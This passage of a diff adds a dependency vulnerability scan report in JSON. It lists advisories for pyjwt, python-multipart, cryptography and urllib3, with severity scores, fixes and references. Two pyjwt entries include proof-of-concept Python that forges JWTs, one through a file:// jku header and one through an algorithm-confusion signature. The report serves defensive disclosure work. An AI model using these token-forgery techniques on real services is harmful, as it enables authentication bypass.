+          "assigner": "SUSE",
+          "baseScore": 4.8,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
+        }
+      ],
+      "description": "## Overview\n\nAffected versions of this package are vulnerable to Unintended Proxy or Intermediary ('Confused Deputy') via the `uri` parameter being passed directly to `urllib.request.urlopen`, which allows fetching resources using unsupported schemes such as `file`, `ftp`, and `data`. An attacker can access arbitrary local files or external resources and potentially forge tokens by supplying crafted URLs.\n\n**Note:**\n\nThis is only exploitable if the application's jku URL ingestion path accepts attacker-controlled URLs.\n## PoC\n```python\nimport jwt as pyjwt\nfrom jwt import PyJWKClient\nfrom cryptography.hazmat.primitives.asymmetric import rsa\nfrom cryptography.hazmat.primitives import serialization\nimport json, base64, time\n\n# Attacker generates keypair (no relation to real IdP)\nkey = rsa.generate_private_key(public_exponent=65537, key_size=2048)\npub_n = key.public_key().public_numbers().n\n\ndef b64u(n):\n    bl = (n.bit_length() + 7) // 8\n    return base64.urlsafe_b64encode(n.to_bytes(bl, 'big')).rstrip(b'=').decode()\n\n# Attacker writes JWK Set containing their public key to /tmp\njwks = {\"keys\":[{\"kty\":\"RSA\",\"kid\":\"attacker\",\"use\":\"sig\",\"alg\":\"RS256\",\n                  \"n\":b64u(pub_n),\"e\":\"AQAB\"}]}\nwith open(\"/tmp/attacker.json\",\"w\") as f:\n    json.dump(jwks, f)\n\n# Attacker mints token signed with their private key, jku=file://\npriv_pem = key.private_bytes(serialization.Encoding.PEM,\n    serialization.PrivateFormat.PKCS8, serialization.NoEncryption())\nnow = int(time.time())\ntoken = pyjwt.encode(\n    {\"sub\":\"attacker\",\"aud\":\"target-app\",\"iat\":now,\"exp\":now+3600},\n    priv_pem, algorithm=\"RS256\",\n    headers={\"kid\":\"attacker\",\"jku\":\"file:///tmp/attacker.json\",\"typ\":\"JWT\"})\n\n# Vulnerable application pattern: caller derives jku from token header\n# and passes to PyJWKClient without scheme validation\nheader = pyjwt.get_unverified_header(token)\nclient = PyJWKClient(header[\"jku\"])      # <-- accepts file:// silently\nkey_obj = client.get_signing_key_from_jwt(token)\ndecoded = pyjwt.decode(token, key_obj.key, algorithms=[\"RS256\"],\n                       audience=\"target-app\")\nprint(\"Token verified:\", decoded)\n# Output: Token verified: {'sub': 'attacker', 'aud': 'target-app', ...}\n```\n## Remediation\nUpgrade `pyjwt` to version 2.13.0 or higher.\n## References\n- [GitHub Advisory](https://github.com/jpadilla/pyjwt/security/advisories/GHSA-993g-76c3-p5m4)\n- [GitHub Commit](https://github.com/jpadilla/pyjwt/commit/95791b1759b8aa4f2203575d344d5c78564cdc81)\n",
+      "disclosureTime": "2026-05-28T16:50:13.000000Z",
+      "epssDetails": {
+        "modelVersion": "v2026.06.15",
+        "percentile": "0.07768",
+        "probability": "0.00181"
+      },
+      "exploit": "Proof of Concept",
+      "exploitDetails": {
+        "maturityLevels": [
+          {
+            "format": "CVSSv3",
+            "level": "Proof of Concept",
+            "type": "secondary"
+          },
+          {
+            "format": "CVSSv4",
+            "level": "Proof of Concept",
+            "type": "primary"
+          }
+        ],
+        "sources": [
+          "Snyk"
+        ]
+      },
+      "fixedIn": [
+        "2.13.0"
+      ],
+      "from": [
+        "sbom@0.0.0",
+        "pyjwt@2.12.1"
+      ],
+      "functions": [],
+      "id": "SNYK-PYTHON-PYJWT-17054901",
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-48522"
+        ],
+        "CWE": [
+          "CWE-441"
+        ],
+        "GHSA": [
+          "GHSA-993g-76c3-p5m4"
+        ]
+      },
+      "isDisputed": false,
+      "isPatchable": false,
+      "isUpgradable": true,
+      "language": "python",
+      "malicious": false,
+      "modificationTime": "2026-06-24T11:12:46.000000Z",
+      "name": "pyjwt",
+      "packageManager": "pip",
+      "packageName": "pyjwt",
+      "patches": [],
+      "proprietary": false,
+      "publicationTime": "2026-05-29T07:42:43.000000Z",
+      "reachability": "not-applicable",
+      "references": [
+        {
+          "title": "GitHub Advisory",
+          "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-993g-76c3-p5m4"
+        },
+        {
+          "title": "GitHub Commit",
+          "url": "https://github.com/jpadilla/pyjwt/commit/95791b1759b8aa4f2203575d344d5c78564cdc81"
+        }
+      ],
+      "semver": {
+        "vulnerable": [
+          "[,2.13.0)"
+        ]
+      },
+      "severity": "low",
+      "severityBasedOn": "CVSS",
+      "severityWithCritical": "low",
+      "socialTrendAlert": false,
+      "title": "Unintended Proxy or Intermediary ('Confused Deputy')",
+      "upgradePath": [
+        false,
+        "pyjwt@2.13.0"
+      ],
+      "version": "2.12.1"
+    },
+    {
+      "alternativeIds": [],
+      "creationTime": "2026-06-16T14:32:03.000000Z",
+      "credit": [
+        "0xkakash1",
+        "sammiee5311"
+      ],
+      "cvssDetails": [],
+      "cvssScore": 6.3,
+      "cvssSources": [
+        {
+          "assigner": "Snyk",
+          "baseScore": 6.3,
+          "cvssVersion": "CVSSv4",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N"
+        },
+        {
+          "assigner": "Snyk",
+          "baseScore": 3.7,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "low",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
+        },
+        {
+          "assigner": "Red Hat",
+          "baseScore": 3.7,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "low",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
+        },
+        {
+          "assigner": "SUSE",
+          "baseScore": 3.7,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "low",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
+        }
+      ],
+      "description": "## Overview\n[python-multipart](https://pypi.org/project/python-multipart) is an A streaming multipart parser for Python\n\nAffected versions of this package are vulnerable to Interpretation Conflict through the `parse_options_header` function. An attacker can bypass field name or filename-based access controls, or manipulate file upload destinations by submitting specially crafted `multipart/form-data` requests that exploit differences in parameter interpretation between upstream components and the backend.\n## Remediation\nUpgrade `python-multipart` to version 0.0.30 or higher.\n## References\n- [GitHub Advisory](https://github.com/Kludex/python-multipart/security/advisories/GHSA-vffw-93wf-4j4q)\n- [GitHub Commit](https://github.com/Kludex/python-multipart/commit/3506c15ce99cb62faf2d5ceb3c4c1e5800cb843d)\n",
+      "disclosureTime": "2026-06-15T20:20:51.000000Z",
+      "epssDetails": {
+        "modelVersion": "v2026.06.15",
+        "percentile": "0.07444",
+        "probability": "0.00177"
+      },
+      "exploit": "Unreported",
+      "exploitDetails": {
+        "maturityLevels": [
+          {
+            "format": "CVSSv3",
+            "level": "Unproven",
+            "type": "secondary"
+          },
+          {
+            "format": "CVSSv4",
+            "level": "Unreported",
+            "type": "primary"
+          }
+        ],
+        "sources": []
+      },
+      "fixedIn": [
+        "0.0.30"
+      ],
+      "from": [
+        "sbom@0.0.0",
+        "python-multipart@0.0.26"
+      ],
+      "functions": [],
+      "id": "SNYK-PYTHON-PYTHONMULTIPART-17345733",
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-53537"
+        ],
+        "CWE": [
+          "CWE-436"
+        ],
+        "GHSA": [
+          "GHSA-vffw-93wf-4j4q"
+        ]
+      },
+      "isDisputed": false,
+      "isPatchable": false,
+      "isUpgradable": true,
+      "language": "python",
+      "malicious": false,
+      "modificationTime": "2026-07-02T11:06:03.000000Z",
+      "name": "python-multipart",
+      "packageManager": "pip",
+      "packageName": "python-multipart",
+      "patches": [],
+      "proprietary": false,
+      "publicationTime": "2026-06-16T14:32:03.000000Z",
+      "reachability": "not-applicable",
+      "references": [
+        {
+          "title": "GitHub Advisory",
+          "url": "https://github.com/Kludex/python-multipart/security/advisories/GHSA-vffw-93wf-4j4q"
+        },
+        {
+          "title": "GitHub Commit",
+          "url": "https://github.com/Kludex/python-multipart/commit/3506c15ce99cb62faf2d5ceb3c4c1e5800cb843d"
+        }
+      ],
+      "semver": {
+        "vulnerable": [
+          "[,0.0.30)"
+        ]
+      },
+      "severity": "medium",
+      "severityBasedOn": "CVSS",
+      "severityWithCritical": "medium",
+      "socialTrendAlert": false,
+      "title": "Interpretation Conflict",
+      "upgradePath": [
+        false,
+        "python-multipart@0.0.30"
+      ],
+      "version": "0.0.26"
+    },
+    {
+      "alternativeIds": [],
+      "creationTime": "2026-05-29T07:34:49.000000Z",
+      "credit": [
+        "Ali Firas (thesmartshadow)"
+      ],
+      "cvssDetails": [],
+      "cvssScore": 6.9,
+      "cvssSources": [
+        {
+          "assigner": "Snyk",
+          "baseScore": 6.9,
+          "cvssVersion": "CVSSv4",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P"
+        },
+        {
+          "assigner": "Snyk",
+          "baseScore": 5.3,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P"
+        },
+        {
+          "assigner": "Red Hat",
+          "baseScore": 5.3,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+        },
+        {
+          "assigner": "SUSE",
+          "baseScore": 7.5,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "description": "## Overview\n\nAffected versions of this package are vulnerable to Allocation of Resources Without Limits or Throttling via the Base64URL decoding process. An attacker can cause excessive CPU and memory consumption by supplying an arbitrarily large payload segment when verifying detached JWS tokens with the unencoded-payload option enabled.\n## Remediation\nUpgrade `pyjwt` to version 2.13.0 or higher.\n## References\n- [GitHub Advisory](https://github.com/jpadilla/pyjwt/security/advisories/GHSA-w7vc-732c-9m39)\n- [GitHub Commit](https://github.com/jpadilla/pyjwt/commit/95791b1759b8aa4f2203575d344d5c78564cdc81)\n",
+      "disclosureTime": "2026-05-28T16:50:07.000000Z",
+      "epssDetails": {
+        "modelVersion": "v2026.06.15",
+        "percentile": "0.20272",
+        "probability": "0.00288"
+      },
+      "exploit": "Proof of Concept",
+      "exploitDetails": {
+        "maturityLevels": [
+          {
+            "format": "CVSSv3",
+            "level": "Proof of Concept",
+            "type": "secondary"
+          },
+          {
+            "format": "CVSSv4",
+            "level": "Proof of Concept",
+            "type": "primary"
+          }
+        ],
+        "sources": [
+          "Snyk"
+        ]
+      },
+      "fixedIn": [
+        "2.13.0"
+      ],
+      "from": [
+        "sbom@0.0.0",
+        "pyjwt@2.12.1"
+      ],
+      "functions": [],
+      "id": "SNYK-PYTHON-PYJWT-17053409",
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-48525"
+        ],
+        "CWE": [
+          "CWE-770"
+        ],
+        "GHSA": [
+          "GHSA-w7vc-732c-9m39"
+        ]
+      },
+      "isDisputed": false,
+      "isPatchable": false,
+      "isUpgradable": true,
+      "language": "python",
+      "malicious": false,
+      "modificationTime": "2026-06-24T11:12:58.000000Z",
+      "name": "pyjwt",
+      "packageManager": "pip",
+      "packageName": "pyjwt",
+      "patches": [],
+      "proprietary": false,
+      "publicationTime": "2026-05-29T07:34:49.000000Z",
+      "reachability": "not-applicable",
+      "references": [
+        {
+          "title": "GitHub Advisory",
+          "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-w7vc-732c-9m39"
+        },
+        {
+          "title": "GitHub Commit",
+          "url": "https://github.com/jpadilla/pyjwt/commit/95791b1759b8aa4f2203575d344d5c78564cdc81"
+        }
+      ],
+      "semver": {
+        "vulnerable": [
+          "[,2.13.0)"
+        ]
+      },
+      "severity": "medium",
+      "severityBasedOn": "CVSS",
+      "severityWithCritical": "medium",
+      "socialTrendAlert": false,
+      "title": "Allocation of Resources Without Limits or Throttling",
+      "upgradePath": [
+        false,
+        "pyjwt@2.13.0"
+      ],
+      "version": "2.12.1"
+    },
+    {
+      "alternativeIds": [],
+      "creationTime": "2025-02-12T07:40:44.000000Z",
+      "credit": [
+        "Apple Inc."
+      ],
+      "cvssDetails": [],
+      "cvssScore": 6.3,
+      "cvssSources": [
+        {
+          "assigner": "Snyk",
+          "baseScore": 6.3,
+          "cvssVersion": "CVSSv4",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N"
+        },
+        {
+          "assigner": "Snyk",
+          "baseScore": 4.8,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
+        },
+        {
+          "assigner": "SUSE",
+          "baseScore": 8.8,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+        },
+        {
+          "assigner": "Red Hat",
+          "baseScore": 7.4,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"
+        }
+      ],
+      "description": "## Overview\n\nAffected versions of this package are vulnerable to Missing Report of Error Condition causing server authentication failures to not be detected by clients, due to handshakes not aborting as expected when the `SSL_VERIFY_PEER` verification mode is set. An attacker could impersonate a legitimate server by performing a MitM attack on TLS and DTLS connections using Raw Public Keys (RPKs).\r\n\r\n**Note:**\r\n\r\n1) This is only exploitable if TLS clients explicitly enable RPK use by the server, and the server, likewise, enables sending of an RPK instead of an X.509 certificate chain. The affected clients are those that then rely on the handshake to fail when the server's RPK fails to match one of the expected public keys, by setting the verification mode to `SSL_VERIFY_PEER`;\r\n\r\n2) Clients that enable server-side raw public keys can still find out that raw public key verification failed by calling `SSL_get_verify_result()`. Those that do, and take appropriate action, are not affected.\n## Remediation\nUpgrade `cryptography` to version 44.0.1 or higher.\n## References\n- [GitHub Commit](https://github.com/openssl/openssl/commit/738d4f9fdeaad57660dcba50a619fafced3fd5e9)\n- [GitHub Commit](https://github.com/pyca/cryptography/commit/adaaaed77db676bbaa9d171175db81dce056e2a7)\n- [OpenSSL Advisory](https://openssl-library.org/news/secadv/20250211.txt)\n",
+      "disclosureTime": "2025-02-11T18:06:42.000000Z",
+      "epssDetails": {
+        "modelVersion": "v2026.06.15",
+        "percentile": "0.81484",
+        "probability": "0.02357"
+      },
+      "exploit": "Unreported",
+      "exploitDetails": {
+        "maturityLevels": [
+          {
+            "format": "CVSSv3",
+            "level": "Unproven",
+            "type": "secondary"
+          },
+          {
+            "format": "CVSSv4",
+            "level": "Unreported",
+            "type": "primary"
+          }
+        ],
+        "sources": []
+      },
+      "fixedIn": [
+        "44.0.1"
+      ],
+      "from": [
+        "sbom@0.0.0",
+        "cryptography@44.0.0"
+      ],
+      "functions": [],
+      "id": "SNYK-PYTHON-CRYPTOGRAPHY-8715586",
+      "identifiers": {
+        "CVE": [
+          "CVE-2024-12797"
+        ],
+        "CWE": [
+          "CWE-392"
+        ],
+        "GHSA": [
+          "GHSA-79v4-65xg-pq4g"
+        ]
+      },
+      "isDisputed": false,
+      "isPatchable": false,
+      "isUpgradable": true,
+      "language": "python",
+      "malicious": false,
+      "modificationTime": "2026-06-16T02:01:03.000000Z",
+      "name": "cryptography",
+      "packageManager": "pip",
+      "packageName": "cryptography",
+      "patches": [],
+      "proprietary": false,
+      "publicationTime": "2025-02-12T07:52:10.000000Z",
+      "reachability": "not-applicable",
+      "references": [
+        {
+          "title": "GitHub Commit",
+          "url": "https://github.com/openssl/openssl/commit/738d4f9fdeaad57660dcba50a619fafced3fd5e9"
+        },
+        {
+          "title": "GitHub Commit",
+          "url": "https://github.com/pyca/cryptography/commit/adaaaed77db676bbaa9d171175db81dce056e2a7"
+        },
+        {
+          "title": "OpenSSL Advisory",
+          "url": "https://openssl-library.org/news/secadv/20250211.txt"
+        }
+      ],
+      "semver": {
+        "vulnerable": [
+          "[42.0.0,44.0.1)"
+        ]
+      },
+      "severity": "medium",
+      "severityBasedOn": "CVSS",
+      "severityWithCritical": "medium",
+      "socialTrendAlert": false,
+      "title": "Missing Report of Error Condition",
+      "upgradePath": [
+        false,
+        "cryptography@44.0.1"
+      ],
+      "version": "44.0.0"
+    },
+    {
+      "alternativeIds": [],
+      "creationTime": "2026-05-12T10:03:23.000000Z",
+      "credit": [
+        "Karim Foughali"
+      ],
+      "cvssDetails": [],
+      "cvssScore": 8.9,
+      "cvssSources": [
+        {
+          "assigner": "Snyk",
+          "baseScore": 8.9,
+          "cvssVersion": "CVSSv4",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H"
+        },
+        {
+          "assigner": "Snyk",
+          "baseScore": 6.8,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:N/A:H"
+        },
+        {
+          "assigner": "NVD",
+          "baseScore": 7.5,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        {
+          "assigner": "Red Hat",
+          "baseScore": 7.5,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "description": "## Overview\n[urllib3](https://pypi.org/project/urllib3/) is a HTTP library with thread-safe connection pooling, file post, and more.\n\nAffected versions of this package are vulnerable to Decompression Bomb either in `HTTPResponse.read()` when Brotli is in use, or when `HTTPResponse.drain_conn()` is called after partial decompression has begun. An attacker can cause excessive resource consumption on the client by sending a highly compressed response that, when decompressed, results in high CPU usage and large memory allocation. \r\n\r\n## Workaround \r\nThis vulnerability can be avoided for the Brotli dependency by switching to brotlicffi.\n## Remediation\nUpgrade `urllib3` to version 2.7.0 or higher.\n## References\n- [GitHub Advisory](https://github.com/urllib3/urllib3/security/advisories/GHSA-mf9v-mfxr-j63j)\n- [GitHub Commit](https://github.com/urllib3/urllib3/commit/2bdcc44d1e163fb5cc48a8662425e35e15adfe6a)\n",
+      "disclosureTime": "2026-05-11T14:51:45.000000Z",
+      "epssDetails": {
+        "modelVersion": "v2026.06.15",
+        "percentile": "0.47736",
+        "probability": "0.00680"
+      },
+      "exploit": "Unreported",
+      "exploitDetails": {
+        "maturityLevels": [
+          {
+            "format": "CVSSv3",
+            "level": "Unproven",
+            "type": "secondary"
+          },
+          {
+            "format": "CVSSv4",
+            "level": "Unreported",
+            "type": "primary"
+          }
+        ],
+        "sources": []
+      },
+      "fixedIn": [
+        "2.7.0"
+      ],
+      "from": [
+        "sbom@0.0.0",
+        "urllib3@2.6.3"
+      ],
+      "functions": [],
+      "id": "SNYK-PYTHON-URLLIB3-16642059",
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-44432"
+        ],
+        "CWE": [
+          "CWE-409"
+        ],
+        "GHSA": [
+          "GHSA-mf9v-mfxr-j63j"
+        ]
+      },
+      "isDisputed": false,
+      "isPatchable": false,
+      "isUpgradable": true,
+      "language": "python",
+      "malicious": false,
+      "modificationTime": "2026-06-30T14:04:27.000000Z",
+      "name": "urllib3",
+      "packageManager": "pip",
+      "packageName": "urllib3",
+      "patches": [],
+      "proprietary": false,
+      "publicationTime": "2026-05-12T10:03:23.000000Z",
+      "reachability": "not-applicable",
+      "references": [
+        {
+          "title": "GitHub Advisory",
+          "url": "https://github.com/urllib3/urllib3/security/advisories/GHSA-mf9v-mfxr-j63j"
+        },
+        {
+          "title": "GitHub Commit",
+          "url": "https://github.com/urllib3/urllib3/commit/2bdcc44d1e163fb5cc48a8662425e35e15adfe6a"
+        }
+      ],
+      "semver": {
+        "vulnerable": [
+          "[2.6.0,2.7.0)"
+        ]
+      },
+      "severity": "high",
+      "severityBasedOn": "CVSS",
+      "severityWithCritical": "high",
+      "socialTrendAlert": false,
+      "title": "Decompression Bomb",
+      "upgradePath": [
+        false,
+        "urllib3@2.7.0"
+      ],
+      "version": "2.6.3"
+    },
+    {
+      "alternativeIds": [],
+      "creationTime": "2026-05-29T07:44:32.000000Z",
+      "credit": [
+        "Unknown"
+      ],
+      "cvssDetails": [],
+      "cvssScore": 5.3,
+      "cvssSources": [
+        {
+          "assigner": "Snyk",
+          "baseScore": 5.3,
+          "cvssVersion": "CVSSv4",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N/E:P"
+        },
+        {
+          "assigner": "Snyk",
+          "baseScore": 5.4,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N/E:P"
+        },
+        {
+          "assigner": "Red Hat",
+          "baseScore": 5.4,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N"
+        },
+        {
+          "assigner": "SUSE",
+          "baseScore": 5.4,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N"
+        }
+      ],
+      "description": "## Overview\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature via the `jwt.decode` or `jwt.decode_complete` functions when used with a `PyJWK` key. An attacker can bypass algorithm restrictions and gain unauthorized access to protected resources by signing a token with a disallowed algorithm, setting an allowed algorithm in the JWT header, and leveraging control over a registered JWK/JWKS private key.\n## PoC\n```python\nimport json\nimport jwt\nfrom cryptography.hazmat.primitives.asymmetric import rsa\nfrom cryptography.hazmat.primitives.serialization import Encoding, PublicFormat\nfrom jwt.api_jwk import PyJWK\nfrom jwt.algorithms import RSAAlgorithm\nfrom jwt.utils import base64url_encode\n\n# Generate an RSA keypair controlled by the attacker.\npriv = rsa.generate_private_key(public_exponent=65537, key_size=2048)\npub = priv.public_key()\npub_pem = pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)\n\n# Build a PyJWK from the public key.\n# With an RSA JWK and no explicit alg, PyJWK binds to RS256 by default.\njwk = PyJWK.from_json(RSAAlgorithm.to_jwk(pub))\n\n# Create a token whose protected header claims RS512.\nheader = {\"typ\": \"JWT\", \"alg\": \"RS512\"}\npayload = {\"sub\": \"alice\"}\n\nheader_b64 = base64url_encode(\n    json.dumps(header, separators=(\",\", \":\"), sort_keys=True).encode()\n)\npayload_b64 = base64url_encode(\n    json.dumps(payload, separators=(\",\", \":\")).encode()\n)\nsigning_input = b\".\".join([header_b64, payload_b64])\n\n# Sign the RS512-labelled token with RS256 instead.\nsig = RSAAlgorithm(RSAAlgorithm.SHA256).sign(signing_input, priv)\ntoken = b\".\".join([header_b64, payload_b64, base64url_encode(sig)]).decode()\n\nprint(\"token:\", token)\nprint(\"PyJWK path:\")\nprint(jwt.decode(token, jwk, algorithms=[\"RS512\"]))\n\nprint(\"PEM path:\")\ntry:\n    print(jwt.decode(token, pub_pem, algorithms=[\"RS512\"]))\nexcept Exception as e:\n    print(f\"{type(e).__name__}: {e}\")\n```\n## Remediation\nUpgrade `pyjwt` to version 2.13.0 or higher.\n## References\n- [GitHub Advisory](https://github.com/jpadilla/pyjwt/security/advisories/GHSA-jq35-7prp-9v3f)\n- [GitHub Commit](https://github.com/jpadilla/pyjwt/commit/95791b1759b8aa4f2203575d344d5c78564cdc81)\n",
+      "disclosureTime": "2026-05-28T16:50:17.000000Z",
+      "epssDetails": {
+        "modelVersion": "v2026.06.15",
+        "percentile": "0.02650",
+        "probability": "0.00127"
+      },
+      "exploit": "Proof of Concept",
+      "exploitDetails": {
+        "maturityLevels": [
+          {
+            "format": "CVSSv3",
+            "level": "Proof of Concept",
+            "type": "secondary"
+          },
+          {
+            "format": "CVSSv4",
+            "level": "Proof of Concept",
+            "type": "primary"
+          }
+        ],
+        "sources": [
+          "Snyk"
+        ]
+      },
+      "fixedIn": [
+        "2.13.0"
+      ],
+      "from": [
+        "sbom@0.0.0",
+        "pyjwt@2.12.1"
+      ],
+      "functions": [],
+      "id": "SNYK-PYTHON-PYJWT-17054902",
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-48523"
+        ],
+        "CWE": [
+          "CWE-347"
+        ],
+        "GHSA": [
+          "GHSA-jq35-7prp-9v3f"
+        ]
+      },
+      "isDisputed": false,
+      "isPatchable": false,
+      "isUpgradable": true,
+      "language": "python",
+      "malicious": false,
+      "modificationTime": "2026-06-24T11:13:02.000000Z",
+      "name": "pyjwt",
+      "packageManager": "pip",
+      "packageName": "pyjwt",
+      "patches": [],
+      "proprietary": false,
+      "publicationTime": "2026-05-29T07:44:32.000000Z",
+      "reachability": "not-applicable",
+      "references": [
+        {
+          "title": "GitHub Advisory",
+          "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-jq35-7prp-9v3f"
+        },
+        {
+          "title": "GitHub Commit",
+          "url": "https://github.com/jpadilla/pyjwt/commit/95791b1759b8aa4f2203575d344d5c78564cdc81"
+        }
+      ],
+      "semver": {
+        "vulnerable": [
+          "[,2.13.0)"
+        ]
+      },
+      "severity": "medium",
+      "severityBasedOn": "CVSS",
+      "severityWithCritical": "medium",
+      "socialTrendAlert": false,
+      "title": "Improper Verification of Cryptographic Signature",
+      "upgradePath": [
+        false,
+        "pyjwt@2.13.0"
+      ],
+      "version": "2.12.1"
+    },
+    {
+      "alternativeIds": [],
+      "creationTime": "2026-06-16T10:50:53.000000Z",
+      "credit": [
+        "Nicolas Lamoureux"
+      ],
+      "cvssDetails": [],
+      "cvssScore": 8.3,
+      "cvssSources": [
+        {
+          "assigner": "Snyk",
+          "baseScore": 8.3,
+          "cvssVersion": "CVSSv4",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N"
+        },
+        {
+          "assigner": "Snyk",
+          "baseScore": 6.5,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N"
+        },
+        {
+          "assigner": "Red Hat",
+          "baseScore": 4.8,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
+        },
+        {
+          "assigner": "SUSE",
+          "baseScore": 3.7,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "low",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
+        }
+      ],
